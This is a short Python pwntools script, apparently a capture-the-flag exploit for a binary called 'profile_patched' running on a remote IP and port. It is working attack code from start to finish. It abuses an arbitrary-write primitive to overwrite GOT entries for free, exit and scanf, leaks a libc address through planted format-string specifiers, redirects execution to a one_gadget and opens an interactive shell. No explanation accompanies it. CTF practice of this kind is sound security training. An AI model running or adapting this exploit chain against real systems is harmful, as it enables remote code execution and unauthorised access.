#!/usr/bin/env python3
from pwn import *

context.encoding = "latin"
context.log_level = "DEBUG"
# context.terminal = ["tmux", "splitw", "-h"]
context.binary = elf = ELF("./profile_patched")
# context.binary = elf = ELF("./profile_patched")
libc = elf.libc
# libc = ELF("./libc.so.6")

gdbscript = """
b main
b *main+169
b get_value
b *get_string+84
c
"""

def send_data(age: int, name: str) -> None:
    p.sendlineafter(b'Age: ', str(age))
    p.sendlineafter(b'Name: ', name)

def arb_write(where: int, what: int, opt = 'all', bytes_o = False) -> None:
    if bytes_o:
        return (send_data(int(hex(where) + '13381337', 16), what))
    send_data(int(hex(where) + '13381337', 16), pack(what, opt))


while True:
    p = remote("54.78.163.105", 31358)
    # p = elf.process()
    # p = gdb.debug(elf.file.name, gdbscript=gdbscript)

    # GOT free
    arb_write(elf.got['free'], elf.sym['main'])
    arb_write(elf.got['exit'], elf.sym['_start'])
    arb_write(elf.got['free'], elf.sym['printf'], opt = 64)

    arb_write(elf.bss(0x100), unpack(b'%p.'*0x10, 'all'))

    p.recvuntil(b'----------------\n0x')
    leak = int(p.recv().decode().split('.')[2], 16) - 0x114a37
    print(f"Leak: {hex(leak)}")

    one = leak + 0xebcf5
    arb_write(elf.got['__isoc99_scanf'], one, opt = 64)

    p.interactive()
    p.close()
    break
